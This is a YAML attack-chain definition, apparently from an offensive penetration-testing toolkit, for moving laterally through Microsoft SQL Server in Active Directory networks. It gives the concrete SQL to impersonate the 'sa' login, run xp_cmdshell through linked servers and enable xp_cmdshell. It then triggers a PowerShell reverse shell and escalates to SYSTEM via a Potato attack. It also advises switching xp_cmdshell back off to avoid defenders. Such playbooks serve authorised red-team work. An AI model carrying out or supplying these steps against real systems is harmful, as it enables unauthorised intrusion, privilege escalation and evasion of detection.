id: mssql-impersonation-chain
name: "Lateral — MSSQL login → impersonate → xp_cmdshell → shell"
description: >
  MSSQL is the most under-defended foothold on AD networks. With any login,
  enumerate impersonation rights and linked servers, walk the trust graph,
  enable xp_cmdshell and pop a SYSTEM/svc shell.
tags: [mssql, lateral-movement, impersonation, xp_cmdshell]
difficulty: medium

inputs:
  - name: target_ip
    source: target_context.ip
    required: true
  - name: user
    source: target_context.user
    required: true
  - name: password
    source: target_context.password

steps:
  - id: probe
    name: "Confirm auth + privilege check"
    command_ref: nxc-mssql-priv
    inputs:
      ip: "${target_ip}"
      user: "${user}"
      password: "${password}"
    notes: |
      `IsSysadmin`, `IsDBOwner`, `HasPrivilege` lines are gold.

  - id: impersonate
    name: "Find IMPERSONATE rights (EXECUTE AS)"
    command_ref: nxc-mssql-enum-impersonate
    inputs:
      ip: "${target_ip}"
      user: "${user}"
      password: "${password}"
    notes: |
      If a low-priv login can EXECUTE AS sa, that's sysadmin via one line:
      `EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');`

  - id: linked_servers
    name: "Linked-server graph"
    command_ref: nxc-mssql-enum-links
    inputs:
      ip: "${target_ip}"
      user: "${user}"
      password: "${password}"
    notes: |
      Walk linked servers with `EXEC ('xp_cmdshell ...') AT [LINKED]`. Often
      the linked server is sysadmin even when the source isn't.

  - id: enable_xpcmdshell
    name: "Enable xp_cmdshell (requires sysadmin)"
    command_ref: nxc-mssql-enable-cmdshell
    inputs:
      ip: "${target_ip}"
      user: "${user}"
      password: "${password}"
    notes: |
      sp_configure 'show advanced options', 1; reconfigure;
      sp_configure 'xp_cmdshell', 1; reconfigure;
      Remember to turn it back off after — defenders watch for it.

  - id: shell_via_xpcmdshell
    name: "Trigger a reverse shell via xp_cmdshell"
    command_ref: nxc-mssql-xpcmdshell
    inputs:
      ip: "${target_ip}"
      user: "${user}"
      password: "${password}"
    notes: |
      Pair with a Mission Control payload from commands/payloads/
      (`rsg-reverseshell-powershell-payload` or a PowerShell base64
      one-liner). The MSSQL service usually runs as a domain svc account
      — that account often has SeImpersonatePrivilege → Potato → SYSTEM.

references:
  - title: "The Hacker Recipes — MSSQL"
    url:   "https://www.thehacker.recipes/ad/movement/mssql"
  - title: "NetExec — MSSQL"
    url:   "https://www.netexec.wiki/mssql-protocol"

next_chains:
  - chain: windows-priv-esc-recon
    when:   'shell returned'
    reason: 'On the box — sweep for privesc.'
  - chain: seimpersonate-potato
    when:   'SeImpersonatePrivilege enabled'
    reason: 'SQL service accounts usually have it — instant SYSTEM.'
